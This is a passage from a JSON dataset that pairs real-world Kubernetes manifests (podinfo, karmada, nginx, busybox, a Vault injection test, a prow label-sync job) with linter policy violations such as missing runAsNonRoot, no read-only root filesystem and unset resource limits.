    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Welcome to Flux Mr. Bond\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "03505",
    "manifest_path": "data/manifests/the_stack_sample/sample_1531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: karmada-kube-controller-manager\n  namespace: karmada-system\n  labels:\n    app: kube-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kube-controller-manager\n  template:\n    metadata:\n      labels:\n        app: kube-controller-manager\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - kube-controller-manager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - command:\n        - kube-controller-manager\n        - --allocate-node-cidrs=true\n        - --authentication-kubeconfig=/etc/karmada/kubeconfig\n        - --authorization-kubeconfig=/etc/karmada/kubeconfig\n        - --bind-address=0.0.0.0\n        - --client-ca-file=/etc/karmada/pki/ca.crt\n        - --cluster-cidr=10.244.0.0/16\n        - --cluster-name=karmada\n        - --cluster-signing-cert-file=/etc/karmada/pki/ca.crt\n        - --cluster-signing-key-file=/etc/karmada/pki/ca.key\n        - --controllers=namespace,garbagecollector,serviceaccount-token\n        - --kubeconfig=/etc/karmada/kubeconfig\n        - --leader-elect=true\n        - --node-cidr-mask-size=24\n        - --port=0\n        - --root-ca-file=/etc/karmada/pki/ca.crt\n        - --service-account-private-key-file=/etc/karmada/pki/sa.key\n        - --service-cluster-ip-range=10.96.0.0/12\n        - --use-service-account-credentials=true\n        - --v=4\n        image: k8s.gcr.io/kube-controller-manager:{{ kube_version }}\n        imagePullPolicy: IfNotPresent\n        name: kube-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/karmada\n          name: k8s-certs\n          readOnly: true\n      volumes:\n      - hostPath:\n          path: /etc/karmada\n          type: DirectoryOrCreate\n        name: k8s-certs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "03506",
    "manifest_path": "data/manifests/the_stack_sample/sample_1531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: karmada-kube-controller-manager\n  namespace: karmada-system\n  labels:\n    app: kube-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kube-controller-manager\n  template:\n    metadata:\n      labels:\n        app: kube-controller-manager\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - kube-controller-manager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - command:\n        - kube-controller-manager\n        - --allocate-node-cidrs=true\n        - --authentication-kubeconfig=/etc/karmada/kubeconfig\n        - --authorization-kubeconfig=/etc/karmada/kubeconfig\n        - --bind-address=0.0.0.0\n        - --client-ca-file=/etc/karmada/pki/ca.crt\n        - --cluster-cidr=10.244.0.0/16\n        - --cluster-name=karmada\n        - --cluster-signing-cert-file=/etc/karmada/pki/ca.crt\n        - --cluster-signing-key-file=/etc/karmada/pki/ca.key\n        - --controllers=namespace,garbagecollector,serviceaccount-token\n        - --kubeconfig=/etc/karmada/kubeconfig\n        - --leader-elect=true\n        - --node-cidr-mask-size=24\n        - --port=0\n        - --root-ca-file=/etc/karmada/pki/ca.crt\n        - --service-account-private-key-file=/etc/karmada/pki/sa.key\n        - --service-cluster-ip-range=10.96.0.0/12\n        - --use-service-account-credentials=true\n        - --v=4\n        image: k8s.gcr.io/kube-controller-manager:{{ kube_version }}\n        imagePullPolicy: IfNotPresent\n        name: kube-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/karmada\n          name: k8s-certs\n          readOnly: true\n      volumes:\n      - hostPath:\n          path: /etc/karmada\n          type: DirectoryOrCreate\n        name: k8s-certs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "03507",
    "manifest_path": "data/manifests/the_stack_sample/sample_1531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: karmada-kube-controller-manager\n  namespace: karmada-system\n  labels:\n    app: kube-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kube-controller-manager\n  template:\n    metadata:\n      labels:\n        app: kube-controller-manager\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - kube-controller-manager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - command:\n        - kube-controller-manager\n        - --allocate-node-cidrs=true\n        - --authentication-kubeconfig=/etc/karmada/kubeconfig\n        - --authorization-kubeconfig=/etc/karmada/kubeconfig\n        - --bind-address=0.0.0.0\n        - --client-ca-file=/etc/karmada/pki/ca.crt\n        - --cluster-cidr=10.244.0.0/16\n        - --cluster-name=karmada\n        - --cluster-signing-cert-file=/etc/karmada/pki/ca.crt\n        - --cluster-signing-key-file=/etc/karmada/pki/ca.key\n        - --controllers=namespace,garbagecollector,serviceaccount-token\n        - --kubeconfig=/etc/karmada/kubeconfig\n        - --leader-elect=true\n        - --node-cidr-mask-size=24\n        - --port=0\n        - --root-ca-file=/etc/karmada/pki/ca.crt\n        - --service-account-private-key-file=/etc/karmada/pki/sa.key\n        - --service-cluster-ip-range=10.96.0.0/12\n        - --use-service-account-credentials=true\n        - --v=4\n        image: k8s.gcr.io/kube-controller-manager:{{ kube_version }}\n        imagePullPolicy: IfNotPresent\n        name: kube-controller-manager\n        resources:\n          requests:\n            cpu: 200m\n        volumeMounts:\n        - mountPath: /etc/karmada\n          name: k8s-certs\n          readOnly: true\n      volumes:\n      - hostPath:\n          path: /etc/karmada\n          type: DirectoryOrCreate\n        name: k8s-certs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-controller-manager\" has memory limit 0"
  },
  {
    "id": "03508",
    "manifest_path": "data/manifests/the_stack_sample/sample_1533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6724\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03509",
    "manifest_path": "data/manifests/the_stack_sample/sample_1533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6724\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03510",
    "manifest_path": "data/manifests/the_stack_sample/sample_1533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6724\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03511",
    "manifest_path": "data/manifests/the_stack_sample/sample_1533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6724\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03512",
    "manifest_path": "data/manifests/the_stack_sample/sample_1533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6724\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03513",
    "manifest_path": "data/manifests/the_stack_sample/sample_1534.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: busybox0\n  labels:\n    app: busybox0\nspec:\n  replicas: 1\n  selector:\n    app: busybox0\n  template:\n    metadata:\n      name: busybox0\n      labels:\n        app: busybox0\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03514",
    "manifest_path": "data/manifests/the_stack_sample/sample_1534.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: busybox0\n  labels:\n    app: busybox0\nspec:\n  replicas: 1\n  selector:\n    app: busybox0\n  template:\n    metadata:\n      name: busybox0\n      labels:\n        app: busybox0\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "03515",
    "manifest_path": "data/manifests/the_stack_sample/sample_1534.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: busybox0\n  labels:\n    app: busybox0\nspec:\n  replicas: 1\n  selector:\n    app: busybox0\n  template:\n    metadata:\n      name: busybox0\n      labels:\n        app: busybox0\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "03516",
    "manifest_path": "data/manifests/the_stack_sample/sample_1534.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: busybox0\n  labels:\n    app: busybox0\nspec:\n  replicas: 1\n  selector:\n    app: busybox0\n  template:\n    metadata:\n      name: busybox0\n      labels:\n        app: busybox0\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "03517",
    "manifest_path": "data/manifests/the_stack_sample/sample_1534.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: busybox0\n  labels:\n    app: busybox0\nspec:\n  replicas: 1\n  selector:\n    app: busybox0\n  template:\n    metadata:\n      name: busybox0\n      labels:\n        app: busybox0\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "03518",
    "manifest_path": "data/manifests/the_stack_sample/sample_1538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: phx.ocir.io/orasejapan/handsontest-001/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cowweb\" does not have a read-only root file system"
  },
  {
    "id": "03519",
    "manifest_path": "data/manifests/the_stack_sample/sample_1538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: phx.ocir.io/orasejapan/handsontest-001/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cowweb\" is not set to runAsNonRoot"
  },
  {
    "id": "03520",
    "manifest_path": "data/manifests/the_stack_sample/sample_1538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: phx.ocir.io/orasejapan/handsontest-001/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cowweb\" has cpu request 0"
  },
  {
    "id": "03521",
    "manifest_path": "data/manifests/the_stack_sample/sample_1538.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n    spec:\n      containers:\n      - name: cowweb\n        image: phx.ocir.io/orasejapan/handsontest-001/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cowweb\" has memory limit 0"
  },
  {
    "id": "03522",
    "manifest_path": "data/manifests/the_stack_sample/sample_1543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-test-aaa\n  namespace: aaa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault\n        app: aaa\n      annotations:\n        vault.security.banzaicloud.io/vault-role: aaa\n        vault.security.banzaicloud.io/vault-skip-verify: 'true'\n        vault.security.banzaicloud.io/vault-path: kubernetes\n        vault.security.banzaicloud.io/vault-ct-configmap: aaa-consul-template\n    spec:\n      serviceAccountName: aaa\n      containers:\n      - name: alpine\n        image: alpine\n        command:\n        - sh\n        - -c\n        - 'echo Direct Env : $AAA_SECRET_DATA_DIRECT_ENV && echo From ConfigMap Env\n          :  $AAA_SECRET_DATA_WITH_CM_ENV && echo From Secret Env :  $AAA_SECRET_DATA_WITH_SECRET_ENV\n          && echo From Mount File : $(cat /vault/secret/AAA_SECRET_DATA_WITH_MOUNT_FILE)\n          && echo going to sleep... && sleep 10000'\n        env:\n        - name: AAA_SECRET_DATA_DIRECT_ENV\n          value: vault:secret/data/sandbox/aaa#AAA_SECRET_DATA_DIRECT_ENV\n        - name: AAA_SECRET_DATA_WITH_CM_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: key-configmap\n              key: AAA_SECRET_DATA_WITH_CM_ENV\n        - name: AAA_SECRET_DATA_WITH_SECRET_ENV\n          valueFrom:\n            secretKeyRef:\n              name: key-secret\n              key: AAA_SECRET_DATA_WITH_SECRET_ENV\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable AAA_SECRET_DATA_DIRECT_ENV in container \"alpine\" found"
  },
  {
    "id": "03523",
    "manifest_path": "data/manifests/the_stack_sample/sample_1543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-test-aaa\n  namespace: aaa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault\n        app: aaa\n      annotations:\n        vault.security.banzaicloud.io/vault-role: aaa\n        vault.security.banzaicloud.io/vault-skip-verify: 'true'\n        vault.security.banzaicloud.io/vault-path: kubernetes\n        vault.security.banzaicloud.io/vault-ct-configmap: aaa-consul-template\n    spec:\n      serviceAccountName: aaa\n      containers:\n      - name: alpine\n        image: alpine\n        command:\n        - sh\n        - -c\n        - 'echo Direct Env : $AAA_SECRET_DATA_DIRECT_ENV && echo From ConfigMap Env\n          :  $AAA_SECRET_DATA_WITH_CM_ENV && echo From Secret Env :  $AAA_SECRET_DATA_WITH_SECRET_ENV\n          && echo From Mount File : $(cat /vault/secret/AAA_SECRET_DATA_WITH_MOUNT_FILE)\n          && echo going to sleep... && sleep 10000'\n        env:\n        - name: AAA_SECRET_DATA_DIRECT_ENV\n          value: vault:secret/data/sandbox/aaa#AAA_SECRET_DATA_DIRECT_ENV\n        - name: AAA_SECRET_DATA_WITH_CM_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: key-configmap\n              key: AAA_SECRET_DATA_WITH_CM_ENV\n        - name: AAA_SECRET_DATA_WITH_SECRET_ENV\n          valueFrom:\n            secretKeyRef:\n              name: key-secret\n              key: AAA_SECRET_DATA_WITH_SECRET_ENV\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"alpine\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03524",
    "manifest_path": "data/manifests/the_stack_sample/sample_1543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-test-aaa\n  namespace: aaa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault\n        app: aaa\n      annotations:\n        vault.security.banzaicloud.io/vault-role: aaa\n        vault.security.banzaicloud.io/vault-skip-verify: 'true'\n        vault.security.banzaicloud.io/vault-path: kubernetes\n        vault.security.banzaicloud.io/vault-ct-configmap: aaa-consul-template\n    spec:\n      serviceAccountName: aaa\n      containers:\n      - name: alpine\n        image: alpine\n        command:\n        - sh\n        - -c\n        - 'echo Direct Env : $AAA_SECRET_DATA_DIRECT_ENV && echo From ConfigMap Env\n          :  $AAA_SECRET_DATA_WITH_CM_ENV && echo From Secret Env :  $AAA_SECRET_DATA_WITH_SECRET_ENV\n          && echo From Mount File : $(cat /vault/secret/AAA_SECRET_DATA_WITH_MOUNT_FILE)\n          && echo going to sleep... && sleep 10000'\n        env:\n        - name: AAA_SECRET_DATA_DIRECT_ENV\n          value: vault:secret/data/sandbox/aaa#AAA_SECRET_DATA_DIRECT_ENV\n        - name: AAA_SECRET_DATA_WITH_CM_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: key-configmap\n              key: AAA_SECRET_DATA_WITH_CM_ENV\n        - name: AAA_SECRET_DATA_WITH_SECRET_ENV\n          valueFrom:\n            secretKeyRef:\n              name: key-secret\n              key: AAA_SECRET_DATA_WITH_SECRET_ENV\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alpine\" does not have a read-only root file system"
  },
  {
    "id": "03525",
    "manifest_path": "data/manifests/the_stack_sample/sample_1543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-test-aaa\n  namespace: aaa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault\n        app: aaa\n      annotations:\n        vault.security.banzaicloud.io/vault-role: aaa\n        vault.security.banzaicloud.io/vault-skip-verify: 'true'\n        vault.security.banzaicloud.io/vault-path: kubernetes\n        vault.security.banzaicloud.io/vault-ct-configmap: aaa-consul-template\n    spec:\n      serviceAccountName: aaa\n      containers:\n      - name: alpine\n        image: alpine\n        command:\n        - sh\n        - -c\n        - 'echo Direct Env : $AAA_SECRET_DATA_DIRECT_ENV && echo From ConfigMap Env\n          :  $AAA_SECRET_DATA_WITH_CM_ENV && echo From Secret Env :  $AAA_SECRET_DATA_WITH_SECRET_ENV\n          && echo From Mount File : $(cat /vault/secret/AAA_SECRET_DATA_WITH_MOUNT_FILE)\n          && echo going to sleep... && sleep 10000'\n        env:\n        - name: AAA_SECRET_DATA_DIRECT_ENV\n          value: vault:secret/data/sandbox/aaa#AAA_SECRET_DATA_DIRECT_ENV\n        - name: AAA_SECRET_DATA_WITH_CM_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: key-configmap\n              key: AAA_SECRET_DATA_WITH_CM_ENV\n        - name: AAA_SECRET_DATA_WITH_SECRET_ENV\n          valueFrom:\n            secretKeyRef:\n              name: key-secret\n              key: AAA_SECRET_DATA_WITH_SECRET_ENV\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alpine\" is not set to runAsNonRoot"
  },
  {
    "id": "03526",
    "manifest_path": "data/manifests/the_stack_sample/sample_1543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-test-aaa\n  namespace: aaa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault\n        app: aaa\n      annotations:\n        vault.security.banzaicloud.io/vault-role: aaa\n        vault.security.banzaicloud.io/vault-skip-verify: 'true'\n        vault.security.banzaicloud.io/vault-path: kubernetes\n        vault.security.banzaicloud.io/vault-ct-configmap: aaa-consul-template\n    spec:\n      serviceAccountName: aaa\n      containers:\n      - name: alpine\n        image: alpine\n        command:\n        - sh\n        - -c\n        - 'echo Direct Env : $AAA_SECRET_DATA_DIRECT_ENV && echo From ConfigMap Env\n          :  $AAA_SECRET_DATA_WITH_CM_ENV && echo From Secret Env :  $AAA_SECRET_DATA_WITH_SECRET_ENV\n          && echo From Mount File : $(cat /vault/secret/AAA_SECRET_DATA_WITH_MOUNT_FILE)\n          && echo going to sleep... && sleep 10000'\n        env:\n        - name: AAA_SECRET_DATA_DIRECT_ENV\n          value: vault:secret/data/sandbox/aaa#AAA_SECRET_DATA_DIRECT_ENV\n        - name: AAA_SECRET_DATA_WITH_CM_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: key-configmap\n              key: AAA_SECRET_DATA_WITH_CM_ENV\n        - name: AAA_SECRET_DATA_WITH_SECRET_ENV\n          valueFrom:\n            secretKeyRef:\n              name: key-secret\n              key: AAA_SECRET_DATA_WITH_SECRET_ENV\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"alpine\" has cpu request 0"
  },
  {
    "id": "03527",
    "manifest_path": "data/manifests/the_stack_sample/sample_1543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-test-aaa\n  namespace: aaa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault\n        app: aaa\n      annotations:\n        vault.security.banzaicloud.io/vault-role: aaa\n        vault.security.banzaicloud.io/vault-skip-verify: 'true'\n        vault.security.banzaicloud.io/vault-path: kubernetes\n        vault.security.banzaicloud.io/vault-ct-configmap: aaa-consul-template\n    spec:\n      serviceAccountName: aaa\n      containers:\n      - name: alpine\n        image: alpine\n        command:\n        - sh\n        - -c\n        - 'echo Direct Env : $AAA_SECRET_DATA_DIRECT_ENV && echo From ConfigMap Env\n          :  $AAA_SECRET_DATA_WITH_CM_ENV && echo From Secret Env :  $AAA_SECRET_DATA_WITH_SECRET_ENV\n          && echo From Mount File : $(cat /vault/secret/AAA_SECRET_DATA_WITH_MOUNT_FILE)\n          && echo going to sleep... && sleep 10000'\n        env:\n        - name: AAA_SECRET_DATA_DIRECT_ENV\n          value: vault:secret/data/sandbox/aaa#AAA_SECRET_DATA_DIRECT_ENV\n        - name: AAA_SECRET_DATA_WITH_CM_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: key-configmap\n              key: AAA_SECRET_DATA_WITH_CM_ENV\n        - name: AAA_SECRET_DATA_WITH_SECRET_ENV\n          valueFrom:\n            secretKeyRef:\n              name: key-secret\n              key: AAA_SECRET_DATA_WITH_SECRET_ENV\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alpine\" has memory limit 0"
  },
  {
    "id": "03528",
    "manifest_path": "data/manifests/the_stack_sample/sample_1547.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20190615-f3db6c682\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "03529",
    "manifest_path": "data/manifests/the_stack_sample/sample_1547.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20190615-f3db6c682\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "03530",
    "manifest_path": "data/manifests/the_stack_sample/sample_1547.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20190615-f3db6c682\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "03531",
    "manifest_path": "data/manifests/the_stack_sample/sample_1547.yaml",
